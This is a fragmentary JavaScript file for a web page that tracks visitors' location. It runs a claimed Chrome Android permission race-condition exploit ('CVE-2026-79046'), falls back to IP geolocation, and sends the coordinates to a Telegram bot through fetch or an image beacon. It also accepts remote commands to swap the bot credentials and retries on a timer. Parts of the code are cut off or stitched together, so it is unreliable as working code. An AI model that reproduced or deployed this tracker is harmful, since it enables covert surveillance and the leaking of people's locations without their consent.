(function(){

/* ============================================================

var CONFIG = {

function $(id){ return document.getElementById(id); }

var latEl=$('latEl'), lngEl=$('lngEl'), accEl=$('accEl'),

    browserBadge=$('browserBadge'), bridgeBadge=$('bridgeBadge'),

var activeVulns = [];

/* ============================================================
   Logging
   ============================================================ */
function log(msg, cls){
  var d = document.createElement('div');
  d.textContent = '[' + new Date().toLocaleTimeString('en',{hour12:false}) + '] ' + msg;
  if(cls) d.className = cls;

function setStatus(msg, type){
  statusBar.textContent = msg;
  statusBar.style.borderColor = type === 'ok' ? '#2ea043' :
                                type === 'err' ? '#da3633' :
                                type === 'warn' ? '#d29922' : '#30363d';
}

function setState(s, type){
  stateEl.textContent = s;
  stateEl.style.color = type === 'ok' ? '#3fb950' :
                        type === 'err' ? '#f85149' : '#e3b341';

var BrowserInfo = {
  ua: navigator.userAgent,
  isChrome: /Chrome\/(\d+)/.test(navigator.userAgent),
  isFirefox: /Firefox\/(\d+)/.test(navigator.userAgent),
  isSafari: /Safari\//.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent),
  isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
  isAndroid: /Android/.test(navigator.userAgent),
  isWebView: /wv\)/.test(navigator.userAgent) || /WebView/.test(navigator.userAgent),
  isSamsung: /SamsungBrowser/.test(navigator.userAgent),
  chromeVersion: 0,
  firefoxVersion: 0
};

(function(){
  var cm = navigator.userAgent.match(/Chrome\/(\d+)/);
  if(cm) BrowserInfo.chromeVersion = parseInt(cm[1],10);
  var fm = navigator.userAgent.match(/Firefox\/(\d+)/);
  if(fm) BrowserInfo.firefoxVersion = parseInt(fm[1],10);
})();

function detectBrowser(){
  var name = 'Unknown', version = '';
  if(BrowserInfo.isSamsung){ name = 'Samsung Internet'; }
  else if(BrowserInfo.isChrome){ name = 'Chrome'; version = BrowserInfo.chromeVersion; }
  else if(BrowserInfo.isFirefox){ name = 'Firefox'; version = BrowserInfo.firefoxVersion; }
  else if(BrowserInfo.isSafari){ name = 'Safari'; }
  if(BrowserInfo.isWebView) name += ' (WebView)';
  if(BrowserInfo.isIOS) name += ' iOS';
  else if(BrowserInfo.isAndroid) name += ' Android';

  browserBadge.textContent = name + (version ? ' ' + version : '');
  browserBadge.className = 'badge ok';
  log('Browser: ' + name + ' ' + version);
  return name;
}

/* ============================================================
   كشف الجسور
   ============================================================ */
var Bridges = {
  reactNative: null, android: null, androidLegacy: null, iosWk: null,
  detect: function(){
    var count = 0;
    if(window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === 'function'){ this.reactNative='RN'; count++; }
    if(window.Android && typeof window.Android.postMessage === 'function'){ this.android='Android'; count++; }
    if(window.AndroidBridge && typeof window.AndroidBridge.postMessage === 'function'){ this.androidLegacy='AB'; count++; }
    if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ios){ this.iosWk='iOS'; count++; }
    bridgeBadge.textContent = count > 0 ? count + ' bridge(s)' : 'no bridge';
    bridgeBadge.className = count > 0 ? 'badge ok' : 'badge warn';
    return count;
  },
  post: function(type, data){
    var p = JSON.stringify({type:type,data:data||{},ts:Date.now()});
    var sent = false;
    try{ if(this.reactNative){ window.ReactNativeWebView.postMessage(p); sent=true; } }catch(e){}
    try{ if(this.android){ window.Android.postMessage(p); sent=true; } }catch(e){}
    try{ if(this.androidLegacy){ window.AndroidBridge.postMessage(p); sent=true; } }catch(e){}
    try{ if(this.iosWk){ window.webkit.messageHandlers.ios.postMessage(p); sent=true; } }catch(e){}
    return sent;
  }
};

var map=null, marker=null, circle=null, mapReady=false;

function initMap(){
  try{
    map = L.map('map').setView([20,0],2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
      maxZoom:19, attribution:'© OSM'
    }).addTo(map);
    mapReady = true;
    setTimeout(function(){ if(map) map.invalidateSize(); },400);
    log('Map ready');
  }catch(e){ log('Map failed: ' + e.message, 'fail'); }
}

function updateMap(lat,lng,acc){
  if(!mapReady) return;
  var p=[lat,lng];
  if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
  if(!circle) circle=L.circle(p,{radius:acc||1000}).addTo(map);
  else{circle.setLatLng(p); circle.setRadius(acc||1000);}
  map.setView(p, acc && acc<2000 ? 15 : 12);
}

function fmt(n,d){ return (n==null||isNaN(n))?'—':Number(n).toFixed(d==null?4:d); }

function displayLocation(info){
  if(!info || info.lat==null || info.lng==null) return false;
  latEl.textContent = fmt(info.lat,5);
  lngEl.textContent = fmt(info.lng,5);
  accEl.textContent = info.accuracy ? Math.round(info.accuracy)+' م' : '—';
  sourceEl.textContent = (info.method||'?').toUpperCase();
  updateMap(info.lat, info.lng, info.accuracy);
  setState('Located', 'ok');
  sendTelegram(info);
  Bridges.post('location', info);
  return true;
}

var lastSent = {lat:null, lng:null, time:0};

function sendTelegram(info){
  if(!CONFIG.enableTelegram || !CONFIG.botToken || !CONFIG.chatId) return;
  var now = Date.now();
  if(lastSent.lat !== null && (now - lastSent.time) < CONFIG.minInterval) return;
  lastSent = {lat:info.lat, lng:info.lng, time:now};

  var msg = '📍 ' + (info.method||'?').toUpperCase() + ':\n' +
            'Lat: ' + info.lat + '\nLng: ' + info.lng + '\n' +
            'Acc: ' + Math.round(info.accuracy||0) + 'm\n' +
            'Source: ' + (info.source||'—') + '\n' +
            'Time: ' + new Date().toLocaleString('ar') + '\n' +
            'https://www.google.com/maps?q=' + info.lat + ',' + info.lng;

  var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';
  try{
    fetch(url,{method:'POST',mode:'no-cors',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+'&text='+encodeURIComponent(msg)
    }).catch(function(){ beacon(url,msg); });
  }catch(e){ beacon(url,msg); }
}

function beacon(url,msg){
  try{
    var i=new Image();
    i.src=url+'?chat_id='+encodeURIComponent(CONFIG.chatId)+
          '&text='+encodeURIComponent(msg)+'&_='+Date.now();
  }catch(e){}
}

/* ----------------------------------------------------------
   [1] CVE-2026-79046 — Race Condition in Permissions
   Chrome Android < 152.0.7977.65
   طلبات متزامنة متعددة لتجاوز فحص الصلاحيات
   ---------------------------------------------------------- */
function exploit_CVE_2026_79046(){
  return new Promise(function(resolve){
    log('▶ [CVE-2026-79046] Race Condition Permissions…', 'vuln');

    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion >= 152){
      log('✗ Patched in Chrome ' + BrowserInfo.chromeVersion, 'fail');
      resolve(null); return;
    }

    var count = CONFIG.raceCount;
    var completed = 0;
    var success = false;
    var results = [];

    // إطلاق طلبات متزامنة بأشكال مختلفة
    for(var i = 0; i < count; i++){
      (function(idx){
        var delay = Math.floor(Math.random() * 200); // تأخير عشوائي
        setTimeout(function(){
          try{
            navigator.geolocation.getCurrentPosition(
              function(pos){
                completed++;
                results.push({idx:idx, ok:true});
                if(!success){
                  success = true;
                  log('✓✓ [CVE-2026-79046] Race won! Request #' + idx, 'success');
                  var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
                              accuracy:pos.coords.accuracy,
                              method:'cve-79046-race', source:'Race Condition'};
                  displayLocation(info);
                  resolve(info);
                }
              },
              function(err){
                completed++;
                results.push({idx:idx, ok:false, code:err.code});
                if(completed >= count && !success){
                  var granted = results.filter(function(r){return r.ok;}).length;
                  log('✗ Race failed — ' + granted + '/' + count, 'fail');
                  resolve(null);
                }
              },
              {enableHighAccuracy: idx % 3 === 0, timeout: 6000 + (idx*200), maximumAge: idx*50}
            );
          }catch(e){ completed++; }
        }, delay);
      })(i);
    }

    setTimeout(function(){
      if(!success){
        var granted = results.filter(function(r){return r.ok;}).length;
        if(granted > 0){ log('✓ Partial race success', 'success'); }
        else { log('✗ Race timeout', 'fail'); }
        resolve(null);
      }
    }, 15000);
  });
}

      if(!resolved){ resolved = true; try{pc.close();}catch(e){}; finalize(); }

async function runExploit(key){
  var ex = exploits[key];
  if(!ex){ log('Unknown exploit: ' + key, 'fail'); return null; }
  setStatus('Running: ' + ex.name + '…');
  try{
    var r = await ex.fn();
    if(r){
      activeVulns.push(ex.name);
      vulnCountBadge.textContent = activeVulns.length + ' active';
      vulnCountBadge.className = 'badge ok';
      setStatus('✓ ' + ex.name + ' succeeded!', 'ok');
    } else {
      setStatus('✗ ' + ex.name + ' failed', 'err');
    }
    return r;
  }catch(e){
    log('✗ Error in ' + ex.name + ': ' + e.message, 'fail');
    setStatus('✗ Error: ' + e.message, 'err');
    return null;
  }
}

async function runAll(){

  vulnCountBadge.className = 'badge';

  for(var key in exploits){
    if(activeVulns.length > 0){
      log('→ Skipping ' + exploits[key].name + ' (already succeeded)', 'success');
      continue;
    }
    await runExploit(key);

}

async function fallbackIP(){
  var providers = [
    {url:'https://ipwho.is/', parse:function(d){
      return d && d.success ? {lat:d.latitude, lng:d.longitude, accuracy:5000,
        country:d.country, city:d.city, isp:d.connection && d.connection.isp,
        method:'ip', source:'ipwho.is'} : null;
    }},
    {url:'https://ipapi.co/json/', parse:function(d){
      return d && d.latitude && !d.error ? {lat:d.latitude, lng:d.longitude,
        accuracy:5000, country:d.country_name, city:d.city, isp:d.org,
        method:'ip', source:'ipapi.co'} : null;
    }},
    {url:'https://get.geojs.io/v1/ip/geo.json', parse:function(d){
      return d && d.latitude ? {lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
        accuracy:8000, country:d.country, city:d.city, isp:d.organization_name,
        method:'ip', source:'geojs.io'} : null;
    }}
  ];

  for(var i=0;i<providers.length;i++){
    var p = providers[i];
    log('→ Trying IP: ' + p.url);
    try{
      var resp = await fetch(p.url);
      var data = await resp.json();
      var parsed = p.parse(data);
      if(parsed && parsed.lat){
        log('✓ IP success: ' + parsed.source, 'success');
        displayLocation(parsed);
        return parsed;
      }
    }catch(e){ log('✗ ' + e.message, 'fail'); }
  }
  log('✗ All IP services failed', 'fail');
  return null;
}

/* ============================================================
   استقبال أوامر
   ============================================================ */
window.addEventListener('message', function(ev){
  var raw = ev && ev.data; if(!raw) return;
  var cmd = raw;
  if(typeof raw === 'string'){ try{ cmd = JSON.parse(raw); }catch(e){ cmd = {type:raw}; } }
  if(!cmd || !cmd.type) return;
  log('← Command: ' + cmd.type);
  switch(cmd.type){
    case 'grant_location_permission':
      log('✓ Permission granted by native');
      break;
    case 'native_location':
      if(cmd.data){
        displayLocation({lat:cmd.data.latitude, lng:cmd.data.longitude,
          accuracy:cmd.data.accuracy||20, method:'native', source:'Native'});
      }
      break;
    case 'set_config':
      if(cmd.data){
        if(cmd.data.botToken) CONFIG.botToken = cmd.data.botToken;
        if(cmd.data.chatId) CONFIG.chatId = cmd.data.chatId;
      }
      break;
  }
});

  await runAll();

  setInterval(function(){
    if(latEl.textContent === '—'){
      log('↻ Heartbeat: retry', 'vuln');
      runAll();
    }
  }, CONFIG.heartbeatMs);
}

if(document.readyState === 'complete' || document.readyState === 'interactive'){
  setTimeout(boot, 100);
} else {
  document.addEventListener('DOMContentLoaded', boot);
}
